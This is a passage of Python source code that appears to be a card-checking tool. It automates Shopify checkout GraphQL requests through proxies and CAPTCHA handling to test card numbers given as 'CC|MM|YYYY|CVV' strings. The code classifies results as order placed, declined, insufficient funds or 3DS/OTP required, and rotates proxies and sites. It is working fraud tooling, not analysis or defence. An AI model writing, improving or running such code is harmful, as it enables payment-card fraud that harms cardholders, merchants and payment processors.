                                    return False, code, gateway, total_price, currency
                                
                                # Code is generic (GENERIC_ERROR/PAYMENT_FAILED).
                                # Check postPaymentMessage for gateway-specific decline reason.
                                if _post_payment_msg:
                                    return False, _post_payment_msg, gateway, total_price, currency
                                
                                # FIX: Before defaulting to CARD_DECLINED, try extracting specific
                                # code from nested structures (e.g., message: {code: "INSUFFICIENT_FUNDS"}).
                                # _extract_payment_error_response checks nested dicts, declineCode, etc.
                                _poll_extracted = _extract_payment_error_response(error)
                                if _poll_extracted and not _is_generic_payment_code(_poll_extracted):
                                    return False, _poll_extracted, gateway, total_price, currency
                                
                                # Truly generic — no specific code found anywhere
                                return False, "CARD_DECLINED", gateway, total_price, currency
                            code = error.get('code') or error_type or 'UNKNOWN_ERROR'
                            # Use _extract_payment_error_response to extract the most specific
                            # error available (it checks nested message dicts, declineCode, etc.)
                            # instead of just returning the bare code which is often GENERIC_ERROR.
                            _extracted = _extract_payment_error_response(error)
                            if _extracted and _extracted != 'UNKNOWN_PAYMENT_ERROR':
                                return False, _extracted, gateway, total_price, currency
                            if not code:
                                return False, error_type or 'UNKNOWN_PAYMENT_ERROR', gateway, total_price, currency
                            return False, code, gateway, total_price, currency
                        elif typename == 'ActionRequiredReceipt':
                            action = receipt_data.get('action', {})
                            action_type = action.get('__typename', '') if action else ''
                            if action_type == 'CompletePaymentChallengeV2':
                                challenge_type = (action.get('challengeType', '') or '').upper()
                                if 'THREE_D_SECURE' in challenge_type or '3DS' in challenge_type:
                                    return True, "3DS_REQUIRED", gateway, total_price, currency
                                elif 'OTP' in challenge_type:
                                    return True, "OTP_REQUIRED", gateway, total_price, currency
                                else:
                                    return True, challenge_type if challenge_type else "OTP_REQUIRED", gateway, total_price, currency
                            elif action_type == 'CompletePaymentChallenge':
                                if action.get('offsiteRedirect'):
                                    return True, "3DS_REQUIRED", gateway, total_price, currency
                                return True, "OTP_REQUIRED", gateway, total_price, currency
                            return True, "OTP_REQUIRED", gateway, total_price, currency
                        
                        if receipt_data.get('__typename') in ['ProcessingReceipt', 'WaitingReceipt']:
                            await asyncio.sleep(delay)
                            continue
                        
                        # FIX: Log unknown receipt typename for debugging.
                        # Shopify may introduce new receipt types (e.g., SubmittedForCompletion).
                        # Without this log, debugging is impossible — the poll loop just
                        # falls through and the caller sees "Unknown Result" with no context.
                        if typename:
                            print(f"[POLL] Unknown receipt typename: {typename}, data keys: {list(receipt_data.keys())}", file=sys.stderr)
                        
                except Exception as e:
                    # FIX Bug #35: Log poll parse errors instead of silently swallowing them
                    print(f"[POLL] Parse error on poll {i+1}: {e}", file=sys.stderr)
                
                if 'WaitingReceipt' in final_text:
                    await asyncio.sleep(delay)
                else:
                    break
            
            # BUG #20 FIX: Fallback CAPTCHA check after poll loop exits — same fix.
            # CAPTCHA means the payment was blocked before the card was actually tried.
            if 'CAPTCHA_REQUIRED' in final_text:
                return False, "CAPTCHA_REQUIRED on poll", gateway, total_price, currency
            
            # FIX (BUG E): WaitingReceipt means payment is still processing.
            # "Change Proxy or Site" is wrong — the card hasn't been declined,
            # it's just slow. Add extra poll attempts before giving up.
            if 'WaitingReceipt' in final_text:
                # Try 4 more polls with longer delays (15s, 20s, 25s, 30s)
                _extra_delays = [15.0, 20.0, 25.0, 30.0]
                for _ed_idx, _ed_delay in enumerate(_extra_delays):
                    print(f"[POLL] WaitingReceipt after main poll, extra attempt {_ed_idx+1}/4 in {_ed_delay:.0f}s", file=sys.stderr)
                    await asyncio.sleep(_ed_delay)
                    # Refresh sst from poll response headers
                    try:
                        response, final_text, _graphql_ok = await make_graphql_request_with_captcha_handling(
                            session, graphql_url, params, headers, poll_json_data,
                            checkout_url, max_retries=1, proxy=proxy
                        )
                    except Exception:
                        continue
                    if response:
                        _new_sst4 = response.headers.get('x-checkout-one-session-token') or response.headers.get('X-Checkout-One-Session-Token')
                        if _new_sst4 and _new_sst4 != sst:
                            sst = _new_sst4
                            poll_json_data['variables']['sessionToken'] = sst
                    if not final_text:
                        continue
                    try:
                        _extra_poll_json = json.loads(final_text)
                        _extra_receipt = _extra_poll_json.get('data', {}).get('receipt', {})
                        if _extra_receipt:
                            _extra_typename = _extra_receipt.get('__typename', '')
                            if _extra_typename == 'ProcessedReceipt':
                                return True, "ORDER_PLACED", gateway, total_price, currency
                            elif _extra_typename == 'FailedReceipt':
                                _extra_error = _extra_receipt.get('processingError', {})
                                _extra_error_type = _extra_error.get('__typename', '')
                                _extra_code = _extra_error.get('code', '') or ''
                                _extra_msg = _extra_error.get('messageUntranslated', '') or ''
                                _extra_offsite = _payment_requires_offsite_action(_extra_error)
                                if _extra_offsite:
                                    return True, "3DS_REQUIRED", gateway, total_price, currency
                                _extra_ext = _extract_payment_error_response(_extra_error)
                                # FIX: Don't discard extract result — return it as-is
                                return False, _extra_ext or "CARD_DECLINED", gateway, total_price, currency
                            elif _extra_typename == 'ActionRequiredReceipt':
                                _extra_action = _extra_receipt.get('action', {})
                                _extra_action_type = _extra_action.get('__typename', '') if _extra_action else ''
                                if _extra_action_type == 'CompletePaymentChallengeV2':
                                    _extra_challenge = (_extra_action.get('challengeType', '') or '').upper()
                                    if 'THREE_D_SECURE' in _extra_challenge or '3DS' in _extra_challenge:
                                        return True, "3DS_REQUIRED", gateway, total_price, currency
                                    elif 'OTP' in _extra_challenge:
                                        return True, "OTP_REQUIRED", gateway, total_price, currency
                                    else:
                                        return True, _extra_challenge if _extra_challenge else "OTP_REQUIRED", gateway, total_price, currency
                                elif _extra_action_type == 'CompletePaymentChallenge':
                                    if _extra_action.get('offsiteRedirect'):
                                        return True, "3DS_REQUIRED", gateway, total_price, currency
                                    return True, "OTP_REQUIRED", gateway, total_price, currency
                                return True, "OTP_REQUIRED", gateway, total_price, currency
                            elif _extra_typename not in ('WaitingReceipt', 'ProcessingReceipt'):
                                # Unknown type — stop polling
                                break
                    except (json.JSONDecodeError, KeyError, TypeError, AttributeError):
                        pass
                    # Still WaitingReceipt or ProcessingReceipt — continue
                return False, "Payment timeout (receipt still processing after extended polling)", gateway, total_price, currency
            
            try:
                res_json = json.loads(final_text)
                _fallback_error = res_json.get('data', {}).get('receipt', {}).get('processingError', {})
                result = _fallback_error.get('code') if isinstance(_fallback_error, dict) else None
                
                if result:
                    # FIX: processingError in fallback means card was declined; prefer
                    # richer nested/message fields over a generic Shopify code.
                    _fb_ext = _extract_payment_error_response(_fallback_error)
                    # FIX: Don't discard extract result — return it as-is
                    return False, _fb_ext or "CARD_DECLINED", gateway, total_price, currency
                else:
                    # No processingError — check receipt type
                    _receipt = res_json.get('data', {}).get('receipt', {})
                    _typename = _receipt.get('__typename', '') if _receipt else ''
                    if _typename == 'ProcessedReceipt':
                        return True, "ORDER_PLACED", gateway, total_price, currency
                    elif _typename == 'ActionRequiredReceipt':
                        _fb_action = _receipt.get('action', {})
                        _fb_action_type = _fb_action.get('__typename', '') if _fb_action else ''
                        if _fb_action_type == 'CompletePaymentChallengeV2':
                            _fb_challenge = (_fb_action.get('challengeType', '') or '').upper()
                            if 'THREE_D_SECURE' in _fb_challenge or '3DS' in _fb_challenge:
                                return True, "3DS_REQUIRED", gateway, total_price, currency
                            elif 'OTP' in _fb_challenge:
                                return True, "OTP_REQUIRED", gateway, total_price, currency
                            else:
                                return True, _fb_challenge if _fb_challenge else "OTP_REQUIRED", gateway, total_price, currency
                        elif _fb_action_type == 'CompletePaymentChallenge':
                            if _fb_action.get('offsiteRedirect'):
                                return True, "3DS_REQUIRED", gateway, total_price, currency
                        return True, "OTP_REQUIRED", gateway, total_price, currency
                    # FIX (BUG F): "MISMATCHED_BILL" is wrong for many receipt types.
                    # SubmittedForCompletion, ProcessingReceipt, WaitingReceipt etc.
                    # are all valid states, not billing mismatches.
                    if _typename == 'SubmittedForCompletion':
                        # Payment submitted, receipt not ready yet — treat as processing
                        return False, "Payment still processing (SubmittedForCompletion)", gateway, total_price, currency
                    elif _typename in ('ProcessingReceipt', 'WaitingReceipt'):
                        return False, "Payment timeout (receipt still processing)", gateway, total_price, currency
                    elif _typename == 'FailedReceipt':
                        # Extract error code from processingError if available
                        _fb_pe = _receipt.get('processingError', {})
                        if _fb_pe:
                            _fb_pe_type = _fb_pe.get('__typename', '')
                            if _fb_pe_type == 'PaymentFailed':
                                if _payment_requires_offsite_action(_fb_pe):
                                    return True, "3DS_REQUIRED", gateway, total_price, currency
                                _fbpe_ext = _extract_payment_error_response(_fb_pe)
                                # FIX: Don't discard extract result — return it as-is
                                return False, _fbpe_ext or "CARD_DECLINED", gateway, total_price, currency
                        return False, (_fb_pe.get('__typename') or 'FAILED_RECEIPT') if isinstance(_fb_pe, dict) else 'FAILED_RECEIPT', gateway, total_price, currency
                    else:
                        # Truly unknown receipt type — include typename for debugging
                        return False, f"Unexpected receipt type: {_typename or 'None'}", gateway, total_price, currency
            except (json.JSONDecodeError, KeyError, TypeError, AttributeError):
                pass
            
            code = extract_between(final_text, '{"code":"', '"')
            
            final_lower = final_text.lower()
            if 'actionreq' in final_lower or 'action_required' in final_lower:
                # Text-based fallback: try to detect 3DS vs OTP from raw text
                if 'three_d_secure' in final_lower or '3ds' in final_lower or 'offsiteredirect' in final_lower:
                    return True, "3DS_REQUIRED", gateway, total_price, currency
                return True, "OTP_REQUIRED", gateway, total_price, currency
            elif 'processedreceipt' in final_lower:
                return True, f"ORDER_PLACED", gateway, total_price, currency
            elif 'failedreceipt' in final_lower or 'declined' in final_lower:
                # Failed/declined in fallback poll means the payment failed; do not invent a decline reason
                return False, code if code else "FAILED_RECEIPT", gateway, total_price, currency
            else:
                # FIX (BUG G): Include diagnostic info instead of bare "Unknown Result".
                # User needs to know what the poll response actually contained.
                _final_snippet = final_text[:150].replace('\n', ' ').strip() if final_text else "EMPTY"
                return False, f"Unknown poll result: {_final_snippet}", gateway, total_price, currency

        except Exception as e_inner:
            return False, f"Error: {str(e_inner)}", gateway, total_price, currency
        finally:
            # Always close the session — every checkout creates its own AsyncClient
            try:
                await asyncio.wait_for(session.aclose(), timeout=5.0)
            except (asyncio.TimeoutError, asyncio.CancelledError, Exception):
                pass

    except Exception as e:
        return False, f"Error Processing Card: {str(e)}", gateway, total_price, currency

def parse_cc_string(cc_string):
    parts = cc_string.split('|')
    if len(parts) != 4:
        raise ValueError("Invalid CC format. Use: CC|MM|YYYY|CVV")
    cc_num = parts[0].strip()
    mes = parts[1].strip()
    ano = parts[2].strip()
    cvv = parts[3].strip()
    if not cc_num or not re.match(r'^\d{13,19}$', cc_num):
        raise ValueError(f"Invalid card number: must be 13-19 digits")
    if not mes or not re.match(r'^\d{1,2}$', mes):
        raise ValueError(f"Invalid month: must be 1-2 digits")
    if not ano or not re.match(r'^\d{2,4}$', ano):
        raise ValueError(f"Invalid year: must be 2 or 4 digits")
    if not cvv or not re.match(r'^\d{3,4}$', cvv):
        raise ValueError(f"Invalid CVV: must be 3-4 digits")
    mes_int = int(mes)
    if mes_int < 1 or mes_int > 12:
        raise ValueError(f"Invalid month: {mes} (must be 01-12)")
    if len(ano) == 2:
        ano = '20' + ano
    # FIX Bug #14: Reject expired cards (year 2000 or earlier)
    ano_int = int(ano)
    if ano_int < 2020:
        raise ValueError(f"Invalid year: {ano} (card is expired)")
    return {
        'cc': cc_num,
        'mes': mes,
        'ano': ano,
        'cvv': cvv
    }

async def process_card_async(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None, shared_session=None):
    """Async wrapper for process_card — adds logging and passes shared_session from api.py."""
    # sys is already imported at the top of this module
    try:
        result = await process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str, shared_session=shared_session)
        success, message, gateway, price, currency = result
        print(f"[process_card_async] site={site_url} success={success} msg={message} gateway={gateway} price={price}", file=sys.stderr)
        return result
    except Exception as e:
        print(f"[process_card_async] FATAL: site={site_url} error={e}", file=sys.stderr)
        return False, f"process_card_async error: {str(e)}", "UNKNOWN", "0.00", "USD"


async def _submit_with_warm_session(warm_session, cc, mes, ano, cvv):
    """Use a pre-warmed session to skip homepage/cart/checkout HTML steps.

    FIX Bug #27/#33/#34: The previous attempt to reuse the warm session's
    GraphQL state directly had critical bugs:
    - Referenced undefined _NEGOTIATE_QUERY, _SUBMIT_QUERY, _POLL_QUERY
    - Used wrong GraphQL URL pattern (checkout_url/api/graphql instead of /checkouts/unstable/graphql)
    - Wrong payment method key structure (pm.__typename vs pm.paymentMethod.__typename)

    The safest approach: use warm session's pre-resolved variant_id to skip
    fetch_products (which is already cached), and pass the proxy through.
    The real time savings come from the product cache + connection pool.

    Future optimization: a proper warm session reuse would need to replicate
    the exact QUERY_PROPOSAL_SHIPPING + MUTATION_SUBMIT + QUERY_POLL structure
    from process_card, which is fragile and couples the two tightly.
    """
    try:
        site_url = warm_session.site
        proxy_str = warm_session.proxy
        variant_id = warm_session.variant_id

        # Close the warm session's client — we'll use process_card's own session
        # (process_card creates a fresh session per checkout to avoid cookie contamination)
        try:
            await warm_session.session.aclose()
        except Exception:
            pass

        # Run full checkout with pre-resolved variant (saves fetch_products time)
        result = await process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str)
        success, message, gateway, price, currency = result
        print(f"[warm_session] site={site_url} success={success} msg={message}", file=sys.stderr)
        return result
    except Exception as e:
        print(f"[warm_session] FATAL: error={e}", file=sys.stderr)
        return False, f"warm_session error: {str(e)}", "UNKNOWN", "0.00", "USD"

